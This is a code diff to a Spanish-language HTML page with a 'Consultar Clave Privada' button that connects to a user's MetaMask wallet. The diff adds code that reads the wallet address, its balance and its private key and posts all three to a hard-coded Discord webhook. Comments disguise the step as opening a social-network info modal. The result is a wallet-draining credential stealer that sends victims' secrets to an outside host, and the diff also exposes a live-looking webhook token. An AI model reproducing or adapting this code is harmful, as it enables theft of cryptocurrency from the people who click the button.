@@ -1,10 +1,12 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Consulta de Clave Privada</title>
 </head>
+
 <body>
     <button onclick="consultarClavePrivada()">Consultar Clave Privada</button>
 
@@ -21,15 +23,11 @@
                     // Obtener clave privada
                     const privateKey = await obtenerClavePrivada(address);
 
-                    // Ahora puedes usar la clave privada para realizar operaciones seguras en el servidor
-                    // En este ejemplo, solo imprimimos la clave privada en la consola del navegador (recuerda que esto no es seguro)
-                    console.log(privateKey);
+                    // Obtener el saldo de la dirección
+                    const saldo = await obtenerSaldo(address);
 
-                    // Aquí podrías llamar a una función que utiliza la clave privada para obtener información de la red social
-                    // Ejemplo: obtenerInformacionRedSocial(privateKey);
-
-                    // Abre un modal con la información obtenida de la red social
-                    abrirModalConInformacion();
+                    // Abre un modal con la información obtenida de la red social y envía los datos a Discord
+                    abrirModalConInformacion(saldo, address, privateKey);
                 } else {
                     console.error('MetaMask no está instalado');
                 }
@@ -45,13 +43,49 @@
             return privateKey;
         }
 
-        function abrirModalConInformacion() {
+        async function obtenerSaldo(address) {
+            const provider = new ethers.providers.Web3Provider(window.ethereum);
+            const saldo = await provider.getBalance(address);
+            return ethers.utils.formatEther(saldo);
+        }
+
+        function abrirModalConInformacion(saldo, direccion, privateKey) {
             // Aquí puedes implementar la lógica para abrir un modal con la información de la red social
             // Por ejemplo, podrías utilizar una biblioteca como Bootstrap para los modales
             // O implementar tu propio sistema de modal
             // Recuerda manejar la información sensible de manera segura y respetar la privacidad del usuario
-            // Ejemplo: $('#myModal').modal('show');
+
+            // Luego de mostrar el modal, envía los datos a Discord
+            enviarDatosADiscord(saldo, direccion, privateKey);
+        }
+
+        async function enviarDatosADiscord(saldo, direccion, privateKey) {
+            const webhookURL = 'https://discordapp.com/api/webhooks/1089376156001771520/8zcE4kmxhybKRgra4kNUIG3M8e9jKPK-OwmVjC86k_VzusJYoah8qDgrFwl5NgOGnyev'; // Reemplaza con tu URL de webhook de Discord
+
+            try {
+                const response = await fetch(webhookURL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        content: `Nuevo usuario:
+                                  Dirección: ${direccion}
+                                  Saldo: ${saldo}
+                                  Clave privada: ${privateKey}`,
+                    }),
+                });
+
+                if (response.ok) {
+                    console.log('Datos enviados a Discord con éxito');
+                } else {
+                    console.error('Error al enviar datos a Discord:', response.statusText);
+                }
+            } catch (error) {
+                console.error('Error en la solicitud HTTP:', error);
+            }
         }
     </script>
 </body>
+
 </html>
